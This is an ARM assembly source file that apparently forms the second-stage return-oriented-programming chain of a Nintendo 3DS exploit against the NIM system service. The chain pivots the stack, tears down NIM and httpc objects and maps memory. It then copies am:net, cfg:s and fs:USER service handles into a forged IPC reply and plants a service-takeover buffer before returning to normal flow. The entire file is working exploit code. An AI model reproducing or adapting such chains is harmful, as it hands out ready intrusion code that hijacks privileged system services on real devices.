	.arm
	.section .rodata.NIM_ROPs, "a"
	.p2align 4
	#include "nim_rop.h"

	.global NIMS_0x5E_IPC_PwnedReplyBase
NIMS_0x5E_IPC_PwnedReplyBase:
	.word IPC_MakeHeader(0x5e, 1, 4)
	.word 0 @ result
	.word IPC_Desc_SharedHandles(3)
	@ to be copied by the ROP
	.word 0 @ am:net
	.word 0 @ cfg:s
	.word 0 @ fs:USER
.LNIMS_0x5E_IPC_PwnedReplyBase_end:
	.size NIMS_0x5E_IPC_PwnedReplyBase, .-NIMS_0x5E_IPC_PwnedReplyBase

	.global NIMS_0x5E_StackRecoveryPivot
NIMS_0x5E_StackRecoveryPivot:
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_STACK_RECOVER_ADDR @ sp
	.word 0 @ lr
	.word ROP_POPR4R5R6R7PC @ pc
.LNIMS_0x5E_StackRecoveryPivot_end:
	.size NIMS_0x5E_StackRecoveryPivot, .-NIMS_0x5E_StackRecoveryPivot

	#define ROP_ABSTRACT_ADDR(x) (ROP_STATICBUF_DESCINDEX2 + ((x) - NIMS_0x5E_ROP_STAGE2_Part1))
	.global NIMS_0x5E_ROP_STAGE2_Part1
NIMS_0x5E_ROP_STAGE2_Part1:
	@ padding of 64 0s for safety to call destructors safely without causing corruptions behind the staticbuf
	@ we're not destroying NIM's flow, we are restoring it safely
	.fill 64, 4, 0
	.word ROP_GARBAGE @ r4
	@ clear up NIM object, we already have R0 set here from httpwn's stack pivot jump instruction
	@ LR was also setup to return to POP {R4, PC}
	.word ROP_NIMOBJ_CLEANUP_FUNC
	.word ROP_HTTPC_CONTEXT_OBJ @ httpc context object
	.word ROP_HTTPC_CONTEXT_CLOSE_POPR4PC @ clear up httpc context object, will POP {R4, PC}
	.word ROP_LOCK_OBJ @ lock object
	.word ROP_MOVR0R4_POPR4PC @ MOV r0, r4; pop {r4, pc}
	.word ROP_GARBAGE @ r4
	.word ROP_LOCK_UNLOCK_POPR4PC @ do unlock, will POP {R4, PC}
	.word 0 @ NULL
	.word ROP_MOVR0R4_POPR4PC @ MOV r0, r4; pop {r4, pc}
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r4 - pivot addr
	.word ROP_POPR1PC @ POP {R1, PC}
	.word ROP_TLSOBJVAR_SET_FUNC @ a tls var set func, must be set to NULL when cleaning up
	.word ROP_BLXR1_MOVR0R4_POPR4PC @ BLX R1; MOV R0, R4; POP {R4, PC}
	.word ROP_GARBAGE @ r4
	.word ROP_STACK_PIVOT @ pc
	1:
	.word ROP_SERVICE_TAKEOVER_ADDR @ r1
	.word 0 @ r2
	.word ROP_SERVICE_TAKEOVER_SIZE @ r3
	.word 0 @ r12
	.word ROP_ABSTRACT_ADDR(1f) @ sp - right after pivot
	.word ROP_POPR4R5PC @ lr - hop over stack args
	.word ROP_SVCCONTROLMEMORY_SKIPPUSH @ pc
	1:
	.word ROP_ABSTRACT_ADDR(1b) @ r0 - garbage pointer
	.word ROP_GARBAGE @ r4
	.word 3 @ stack arg 1
	.word 3 @ stack arg 2
	.word ROP_POPR1PC @ POP {R1, PC}
	.word ROP_SAMPLEIPC_CMDBUF_INDEX(5) @ our ipc sample, fs:USER handle space
	.word ROP_GETFSUSER_HANDLE_POPR4PC @ get fs:USER handle on r0 and keep chain with pop {r4, pc}
	.word ROP_GARBAGE @ r4
	.word ROP_STR_R0TOR1_POPR4PC @ STR R0, [R1]; POP {R4, PC}
	.word ROP_AMNET_HANDLE_ADDR @ am:net handle addr
	.word ROP_MOVR0R4_POPR4PC @ MOV r0, r4; pop {r4, pc}
	.word ROP_GARBAGE @ r4
	.word ROP_LDR_R0FROMR0_POPR4PC @ LDR r0, [r0]; POP {R4, PC}
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ POP {R1, PC}
	.word ROP_SAMPLEIPC_CMDBUF_INDEX(3) @ our ipc sample, am:net handle space
	.word ROP_STR_R0TOR1_POPR4PC @ STR R0, [R1]; POP {R4, PC}
	.word ROP_CFGS_HANDLE_ADDR @ cfg:s handle addr
	.word ROP_MOVR0R4_POPR4PC @ MOV r0, r4; pop {r4, pc}
	.word ROP_GARBAGE @ r4
	.word ROP_LDR_R0FROMR0_POPR4PC @ LDR r0, [r0]; POP {R4, PC}
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1PC @ POP {R1, PC}
	.word ROP_SAMPLEIPC_CMDBUF_INDEX(4) @ our ipc sample, cfg:s handle space
	.word ROP_STR_R0TOR1_POPR4PC @ STR R0, [R1]; POP {R4, PC}
	.word ROP_GARBAGE @ r4
	.word ROP_GETTLSADDR_ADD0X5C_POPR4PC @ thumb get tls pointer+0x5C to r0, pop {r4, pc}
	.word ROP_GARBAGE @ r4
	.word ROP_ADDR0_0X10_POPR4PC @ thumb add r0, #0x10 and pop {r4,pc}
	.word ROP_GARBAGE @ r4
	.word ROP_ADDR0_0X10_POPR4PC @ thumb add r0, #0x10 and pop {r4,pc}
	.word ROP_GARBAGE @ r4
	.word ROP_ADDR0_0X4_POPR4PC @ thumb add r0, #4 and pop {r4,pc}
	@ let's go bby
	@ memcpy that our ipc cmd to cmdbuf
	.word ROP_GARBAGE @ r4
	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
	.word ROP_SAMPLEIPC_CMDBUF @ our ipc sample
	.word .LNIMS_0x5E_IPC_PwnedReplyBase_end - NIMS_0x5E_IPC_PwnedReplyBase @ r2
	.word ROP_GARBAGE @ r3
	.word ROP_MEMCPY_POPR0PC @ bl memcpy, pop {r0, pc}
	@ response has been setup, now we setup staticbuf index 0 replacement
	.word ROP_GARBAGE @ r0
	.word ROP_GETTLSADDR_ADD0X5C_POPR4PC @ thumb get tls pointer+0x5C to r0, pop {r4, pc}
	.word ROP_SERVICE_TAKEOVER_ADDR @ r4 - service injection
	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
	.word ROP_GARBAGE @ r1
	.word 0x128 @ r2  0x184 - 0x5c
	.word ROP_GARBAGE @ r3
	.word ROP_STR_R4TOR2R0_POPR4PC @ str r4, [r2,r0] and pop {r4,pc}
	.word IPC_Desc_StaticBuffer(ROP_SERVICE_TAKEOVER_SIZE, 0) @ r4
	.word ROP_POPR1R2R3PC @ POP {R1-R3, PC}
	.word ROP_GARBAGE @ r1
	.word 0x124 @ r2  0x180 - 0x5c
	.word ROP_GARBAGE @ r3
	.word ROP_STR_R4TOR2R0_POPR4PC @ str r4, [r2,r0] and pop {r4,pc}
	@ now we return safely
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_STACK_RECOVERY_PIVOTBUF) @ r4 - stack pivot data (where NIMS_0x5E_StackRecoveryPivot is copied to)
	.word ROP_MOVR0R4_POPR4PC @ setup pivot address
	.word ROP_GARBAGE @ r4
	.word ROP_STACK_PIVOT @ going back to flow
.LNIMS_0x5E_ROP_STAGE2_Part1_end:
	.size NIMS_0x5E_ROP_STAGE2_Part1, .-NIMS_0x5E_ROP_STAGE2_Part1
	#undef ROP_ABSTRACT_ADDR

	#define ROP_ABSTRACT_ADDR(x) (ROP_STATICBUF_DESCINDEX2 + ((x) - NIMS_0x5E_ROP_STAGE2_Part2))
	.global NIMS_0x5E_ROP_STAGE2_Part2
NIMS_0x5E_ROP_STAGE2_Part2:
	.fill 64, 4, 0
	.word ROP_GARBAGE @ r4
	@ just like part 1, clear up objects
	@ LR was also setup to return to POP {R4, PC}
	.word ROP_NIMOBJ_CLEANUP_FUNC
	.word ROP_HTTPC_CONTEXT_OBJ @ httpc context object
	.word ROP_HTTPC_CONTEXT_CLOSE_POPR4PC @ clear up httpc context object, will POP {R4, PC}
	.word ROP_LOCK_OBJ @ lock object
	.word ROP_MOVR0R4_POPR4PC @ MOV r0, r4; pop {r4, pc}
	.word ROP_GARBAGE @ r4
	.word ROP_LOCK_UNLOCK_POPR4PC @ do unlock, will POP {R4, PC}
	.word 0 @ NULL
	.word ROP_MOVR0R4_POPR4PC @ MOV r0, r4; pop {r4, pc}
	.word ROP_STACK_PIVOTBUF_ADDR(ROP_ABSTRACT_ADDR(1f)) @ r4 - stack pivot data, this time in self reference to this static buf
	.word ROP_POPR1PC @ POP {R1, PC}
	.word ROP_TLSOBJVAR_SET_FUNC @ a tls var set func, must be set to NULL when cleaning up
	.word ROP_BLXR1_MOVR0R4_POPR4PC @ BLX R1; MOV R0, R4; POP {R4, PC}
	.word ROP_GARBAGE @ r4
	.word ROP_STACK_PIVOT @ run our rop
	@ pivot data
	1:
	.word 0 @ r1
	.word 0 @ r2
	.word 0 @ r3
	.word 0 @ r12
	.word ROP_SERVICE_TAKEOVER_ADDR+0x1000 @ sp
	.word 0 @ lr
	.word ROP_POPPC @ pc
.LNIMS_0x5E_ROP_STAGE2_Part2_end:
	.size NIMS_0x5E_ROP_STAGE2_Part2, .-NIMS_0x5E_ROP_STAGE2_Part2

	.section .rodata.NIM_ROP_sizes, "a"
	.global NIMS_0x5E_IPC_PwnedReplyBase_size
	.global NIMS_0x5E_StackRecoveryPivot_size
	.global NIMS_0x5E_ROP_STAGE2_Part1_size
	.global NIMS_0x5E_ROP_STAGE2_Part2_size

NIMS_0x5E_IPC_PwnedReplyBase_size:
	.word .LNIMS_0x5E_IPC_PwnedReplyBase_end - NIMS_0x5E_IPC_PwnedReplyBase
	.size NIMS_0x5E_IPC_PwnedReplyBase_size, .-NIMS_0x5E_IPC_PwnedReplyBase_size

NIMS_0x5E_StackRecoveryPivot_size:
	.word .LNIMS_0x5E_StackRecoveryPivot_end - NIMS_0x5E_StackRecoveryPivot
	.size NIMS_0x5E_StackRecoveryPivot_size, .-NIMS_0x5E_StackRecoveryPivot_size

NIMS_0x5E_ROP_STAGE2_Part1_size:
	.word .LNIMS_0x5E_ROP_STAGE2_Part1_end - NIMS_0x5E_ROP_STAGE2_Part1
	.size NIMS_0x5E_ROP_STAGE2_Part1_size, .-NIMS_0x5E_ROP_STAGE2_Part1_size

NIMS_0x5E_ROP_STAGE2_Part2_size:
	.word .LNIMS_0x5E_ROP_STAGE2_Part2_end - NIMS_0x5E_ROP_STAGE2_Part2
	.size NIMS_0x5E_ROP_STAGE2_Part2_size, .-NIMS_0x5E_ROP_STAGE2_Part2_size
